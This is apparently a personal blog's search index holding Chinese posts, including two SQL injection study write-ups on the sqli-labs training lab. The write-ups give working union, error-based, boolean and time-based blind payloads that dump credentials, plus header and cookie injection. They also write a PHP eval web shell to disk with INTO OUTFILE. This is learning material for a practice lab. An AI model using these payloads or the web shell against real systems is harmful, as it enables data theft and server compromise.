<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[八月总结]]></title>
    <url>%2F2017%2F09%2F01%2F%E5%85%AB%E6%9C%88%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[八月反思总结 学习方面1.总体来说还是学习了一些东西，一边看理论一边实践地把sqli-labs上的基础部分基本刷了一遍，后面就是学习进阶部分以及去各种平台刷题学习新姿势了。 2.大体上看了一下文件上传漏洞和文件包含漏洞，但学的不精，没有真正掌握吧，后面会再来做这一部分。 3.emmmm其他感觉就没有了。。。真的做的事情还是太少了 反思1.还是太懒了！！！！ 自制力不够，不能持之以恒的学习，后面一定要克服这个问题，毕竟压力大，自己又太菜了。。。。 2.希望做事情有个规划，感觉现在很多时候都是想到啥做啥，或者不做，没有计划，没有目标，更没有执行力。 新学期目标1.好好学专业课，好好学专业课，好好学专业课。 重要的事情说三遍，大一太浪了，成绩虽然也还过得去，但还是没有用心学习。 希望大二好好学习，能拿一个好一点的奖学金。。 2.过六级，过六级，过六级。 重要的事情说三遍。 学好英语太重要了，在学习web的过程中深刻地认识到了这个问题，光个github基本不认识单词，很难受。 不能再像上学期那样裸考了。。 3.健身，健身，健身。 重要的事情说三遍。身体才是最大的资本，希望能为祖国健康工作50年，23333333]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql学习（一）]]></title>
    <url>%2F2017%2F08%2F13%2Fsql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[前言 最近花了一些时间把sql注入方面的基础知识结合sqlilabs的教程看完了，这里就做一个总结。 基础知识1.sql注入原理SQL注入漏洞的形成原因是：用户输入的数据或语句被sql解释器执行，而我们所要做的就是利用SQL注入绕过登录验证 2.sql注入分类分类见仁见智，就最基础的可大致这样来看 基于从服务器接收到的响应 基于错误的SQL注入 联合查询 sql盲注 基于注入点位置上的 post型注入 cookie注入 http头注入 3.常用尝试语句or 1=1 --+ &apos;or 1=1 --+ &quot;or 1=1 --+ )or 1=1 --+ &apos;)or 1=1 --+ &quot;)or 1=1 --+ &quot;)or 1=1 --+ 实战讲解（以sqli-labs为例）1.基于报错的注入，与联合查询结合使用，例如less-1 首先测试 ?id=1 ?id=1&apos; 我们可看到出现报错，sql语句有错误，我们可以分析出是单引号闭合问题。接着 ?id=1&apos; or 1=1 --+ 回显正确。针对此类注入，因为没有任何绕过，我们即可进行最简单的注入操作。 ?id=1&apos; order by 3 --+ 猜解出有3列数据，接下来使用联合查询（union查询即同时查询多个语句，我们通过使第一个语句错误，来执行写入的sql语句） 爆数据库1?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata --+ 我们可以看到爆出了数据库名称，这里选择security数据库 爆数据表1?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+ 爆列名1?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+ 爆数据1?id=-1' union select 1,username,password from users where id=2 --+ 成功获得用户名和密码 2.sql盲注，例如less5①:利用报错注入，这种方式主要是利用count(*)聚合函数 把查询的部分以错误的形式显示出来 基础知识 order by 语句 用于根据制定的列队结果集进行排序 count(*) 函数返回表中的记录数 concat(*) 函数 拼接一个或多个字符串 concat_ws(separator,str1,str2) 第一个参数为分隔符，分隔符放在字符串中间。eg：select concat_ws(‘,’,’11’,’22’); 11,22 group_concat()分组拼接函数 group by 语句用于结合合计函数。 数值处理 floor() 函数用于取整 rand()函数 在0和1之间产生一个随机数 payload 1?id=1' union select 1,count(*),concat('~',select user(),'~',floor(rand()*2)) as a from information_schema.tables group by a --+ 得到回显查数据库1?id=1' union select 1,count(*),concat('~',(select database()),'~',floor(rand()*2)) as a from information_schema.tables group by a%23 查表1?id=1' union select 1,count(*),concat('~',(select table_name from information_schema.tables where table_schema='security'limit 0,1),'~',floor(rand()*2)) as a from information_schema.tables group by a%23 改变limit1,1 limit2,1 可得到四个表，我们需要的是users表 emails referers uagents users 查列1?id=1' union select 1,count(*),concat('~',(select column_name from information_schema.columns where table_name='users' limit 0,1),'~',floor(rand()*2)) as a from information_schema.tables group by a%23 改变limit1,1 limit2,1 以此可得到username、password 最后一步爆数据1?id=1' union select 1,count(*),concat('~',(select username from users where id='2' limit 0,1),'~',floor(rand()*2)) as a from information_schema.tables group by a%23 再查password 成功拿到用户名和密码 ②:利用布尔盲注，这种方式主要是通过构造逻辑判断来进行注入 基础知识 left(a,b) 函数从左侧截取a的前b位 Ord() ascii() 函数将字符转化为ascii值 mid(a,b,c) substr(a,b,c) 函数从b位置开始，截取字符串a的c长度 regexp ‘~[a-z]’ 匹配正则表达式用法一般为：select user() regexp ‘~[a-z]’也可用like匹配 开始对网页进行尝试： 数据库 ?id=1 and left(database(),1)&gt;&apos;a&apos;--+ 查看数据库第一位是否&gt;a 由于我们的数据库为’security’,很明显是大于的，页面也返回正常 ?id=1&apos; and left(database(),2)&gt;&apos;sa&apos;--+ 查看前两位是否大于sa 以此类推，利用二分法可得出数据库的名称。补：也可以利用substr()和ascii()将得到的内容转换成ascii值来得出名称比如查询security数据库下的第一个表的第一个字符1?id=1 and ascii(substr(select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)&gt;80 此处仍然用二分法进行测试，直到回显正确。可以得到ascii值为101的时候正确，因为第一个表是email，e的ascii码为101 改变substr的数字，即可得到后面的字符 查看列 可利用regexp 正则匹配来获取user表中的列1?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp '~us[a-z]' limit 0,a)--+ 即查询users表中是否存在为us**的列，页面回显正常2即为存在，以此种方法我们可以查出username和password 以上几种方法通用，选择任何一种方法都能爆出数据，但此中方法花费时间较长，不推荐使用。 此部分可参考Lcamry的mysql-injection ③:利用延迟注入，延时注入主要是针对页面无变化、无法用布尔真假判断、无法报错的情况下的注入技术基础知识 sleep() 延时 if(condition,true,false) 延时注入的原理就是，所要报的信息的ascii码正确时，产生延时，否则不延时。（反过来也可） ?id=1&apos; and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+ 意思是数据库名称第一个字符的ascii码是否为115，正确则返回页面，错误则产生5s的时间延迟。通过这样database()可用查询信息替换，以此来爆出表名列名数据等等。也有benchmark()延时注入，与sleep用法相似。 3.POST型注入 post即是数据从客户端提交到服务器端 当我们输入正确的用户名和密码，回显正确。在post过程中，我们输入用户名和密码后台也能形成sql语句，我们就可以像get型一样构造post的payload。我们可以输入万能用户名来测试username:admin ‘#password:123（随便输）我们可以看到对单引号的处理，接着我们尝试输入username:admin’ or ‘1’=’1# 密码随意 得到回显正确 在此我们就可用union注入进行尝试：12username:1admin' union select 1,database()#password:随意 我们可以看到爆出了数据库security接下来以此类推，构造sql语句进行注入 在其他的post关卡中，有的不会显示你的登录信息，只会显示是否登录成功，此种情况就需要进行盲注。 4.http头注入和cookie注入 http：以less18为例当我们输入数据库中的用户名和密码时，页面返回了useragent的信息尝试对username进行注入，发现始终失败。通过查看源代码，发现对uname和passwd进行了check_out()函数的处理，但我们在sql语句中看到了insert()我们看到插入了useragent和ip，修改ip不方便，我们就可以通过修改useragent来进行注入。 利用burpsuite进行抓包改包把useragent修改为1'and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '1'='1 得到回显 爆出了数据库security，以此类推改变sql语句，我们可以相继爆表名，爆列名，爆数据。 cookie注入：以less20为例 输入正确的用户名和密码，发现页面无任何反应，从题目可知这关涉及到cookie，因此我们仍然抓包改包 我们将cookie内容改为：1uname=admin1'and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '1'='1 GO一下得到页面 爆出数据库名security，以此类推。 补：这两种注入情况也有其他注入姿势，在这里值阐述最基本操作 导入导出文件注入 这种注入以less7为例 参数测试，通过源代码可知 所以12?id=1'))?id=1')) or 1=1 --+ 回显正确，接下来进行文件导出1?id=1')) union select 1,2,3 into outfile "D:\\phpstudy\\WWW\\Less-7\\test.txt" --+ 可看到虽然回显提示有错误，但我们的less7下已经创建了test.txt文件 接下来我们插入一句话1?id=1'))union select 1,2,'&lt;?php @eval($_post["mima"]) ?&gt;' into outfile "d:\\phpstudy\\WWW\\Less-7\\yijuhua.php"--+ 可以看到写入成功，然后我们用菜刀连接 连接成功后即可进入后台操作文件 总结至此，通过对sqlilabs第一部分的基础学习，掌握了SQL注入的一些基础姿势，绕过方式及其他注入操作或者奇怪姿势还需进一步学习。]]></content>
      <categories>
        <category>注入学习</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[随笔]]></title>
    <url>%2F2017%2F08%2F11%2FpostName%2F</url>
    <content type="text"><![CDATA[今日心得 折腾了一下午到现在，总算把这个博客建成了，其中也饶了很多弯路，犯了很多错误，希望后面能长点脑子吧。 刚刚建成，还有很多功能还不完善，后面需要的时候再来弄吧。先让我高兴会儿~~]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlilabs——less5]]></title>
    <url>%2F2017%2F08%2F11%2FLess-5%20%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[Less-5 学习 由于这两天一直在看sql盲注方面的东西，在这里就以sqliabs less-5为例分享我的学习心得。 wp首先对网页最基本的注入 12?id=1' ?id=1' or 1=1 --+ 显示正常，但我们可以发现网页并没有像前四关一样回显出数据库的信息，通过查看源代码可以发现 没有输出$row为了方便查看，我们在源代码里添加代码，输出sql语句 接下来分别利用三种注入方式 利用报错注入基础知识 order by 语句 用于根据制定的列队结果集进行排序 count(*) 函数返回表中的记录数 concat(*) 函数 拼接一个或多个字符串 concat_ws(separator,str1,str2) 第一个参数为分隔符，分隔符放在字符串中间。eg：select concat_ws(‘,’,’11’,’22’); 11,22 group_concat()分组拼接函数 group by 语句用于结合合计函数。 数值处理 floor() 函数用于取整 rand()函数 在0和1之间产生一个随机数 这种方式主要是利用count(*)聚合函数 把查询的部分以错误的形式显示出来 payload 1?id=1' union select 1,count(*),concat('~',select user(),'~',floor(rand()*2)) as a from information_schema.tables group by a --+ 得到回显查数据库 ?id=1&apos; union select 1,count(*),concat(&apos;~&apos;,(select database()),&apos;~&apos;,floor(rand()*2)) as a from information_schema.tables group by a%23 查表 ?id=1&apos; union select 1,count(*),concat(&apos;~&apos;,(select table_name from information_schema.tables where table_schema=&apos;security&apos;limit 0,1),&apos;~&apos;,floor(rand()*2)) as a from information_schema.tables group by a%23 改变limit1,1 limit2,1 可得到四个表，我们需要的是users表 emails referers uagents users 查列 ?id=1&apos; union select 1,count(*),concat(&apos;~&apos;,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),&apos;~&apos;,floor(rand()*2)) as a from information_schema.tables group by a%23 改变limit1,1 limit2,1 以此可得到username、password 最后一步爆数据 ?id=1&apos; union select 1,count(*),concat(&apos;~&apos;,(select username from users where id=&apos;2&apos; limit 0,1),&apos;~&apos;,floor(rand()*2)) as a from information_schema.tables group by a%23 再查password 成功拿到用户名和密码 利用布尔盲注这种方式主要是通过构造逻辑判断来进行注入 基础知识 left(a,b) 函数从左侧截取a的前b位 Ord() ascii() 函数将字符转化为ascii值 mid(a,b,c) substr(a,b,c) 函数从b位置开始，截取字符串a的c长度 regexp ‘~[a-z]’ 匹配正则表达式用法一般为：select user() regexp ‘~[a-z]’也可用like匹配 开始对网页进行尝试： 数据库 ?id=1 and left(database(),1)&gt;&apos;a&apos;--+ 查看数据库第一位是否&gt;a 由于我们的数据库为’security’,很明显是大于的，页面也返回正常 ?id=1&apos; and left(database(),2)&gt;&apos;sa&apos;--+ 查看前两位是否大于sa 以此类推，利用二分法可得出数据库的名称。补：也可以利用substr()和ascii()将得到的内容转换成ascii值来得出名称比如查询security数据库下的第一个表的第一个字符 ?id=1 and ascii(substr(select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)&gt;80 此处仍然用二分法进行测试，直到回显正确。可以得到ascii值为101的时候正确，因为第一个表是email，e的ascii码为101 改变substr的数字，即可得到后面的字符 查看列 可利用regexp 正则匹配来获取user表中的列 ?id=1&apos; and 1=(select 1 from information_schema.columns where table_name=&apos;users&apos; and table_name regexp &apos;~us[a-z]&apos; limit 0,a)--+ 即查询users表中是否存在为us**的列，页面回显正常2即为存在，以此种方法我们可以查出username和password 以上几种方法通用，选择任何一种方法都能爆出数据，但此中方法花费时间较长，不推荐使用。 此部分可参考Lcamry的mysql-injection 利用时间延迟注入延时注入主要是针对页面无变化、无法用布尔真假判断、无法报错的情况下的注入技术基础知识 sleep() 延时 if(condition,true,false) 延时注入的原理就是，所要报的信息的ascii码正确时，产生延时，否则不延时。（反过来也可） ?id=1&apos; and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+ 意思是数据库名称第一个字符的ascii码是否为115，正确则返回页面，错误则产生5s的时间延迟。通过这样database()可用查询信息替换，以此来爆出表名列名数据等等。也有benchmark()延时注入，与sleep用法相似。]]></content>
      <categories>
        <category>注入学习</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
</search>
